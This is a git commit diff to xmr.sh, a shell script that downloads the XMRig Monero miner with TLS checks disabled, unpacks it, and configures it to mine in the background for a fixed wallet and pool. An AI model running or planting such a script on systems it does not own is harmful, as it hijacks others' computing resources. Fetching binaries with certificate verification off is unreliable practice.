ac8f66545463966a5636a1bfa6295d32da691a0f
zkysimon <61656204+zkysimon@users.noreply.github.com>
2021-05-11 09:59:07 +0800

    Update xmr.sh

--- xmr.sh
+++ xmr.sh
@@ -1,15 +1,18 @@
 #!/bin/bash
 
 # variables
-BASE_URL="https://raw.githubusercontent.com/zkysimon/xmr/main/xmrig"
+BASE_URL="https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-static-x64.tar.gz"
 POOL="pool.minexmr.com:3333"
 WALLET="43K8b6cvTxQSQYBxE5y1uCFRXrmSazVf5fP2T31uZiBWKnyTgGKurgtL7H67TMb2KTPYfjdoJMdve4PTXcUTtyaCUD6YAVY"
 UUID=$(cut -d '-' -f 1 /proc/sys/kernel/random/uuid)
 BACKGROUND=true
 DONATE=0
 
+rm -rf xmrig-6.12.1
+rm -rf xmrig-6.12.1-linux-static-x64.tar.gz
 wget --no-check-certificate ${BASE_URL}
-chmod +x xmrig
+tar -xzvf xmrig-6.12.1-linux-static-x64.tar.gz
+cd xmrig-6.12.1
 
 # prepare config
 rm -f config.json
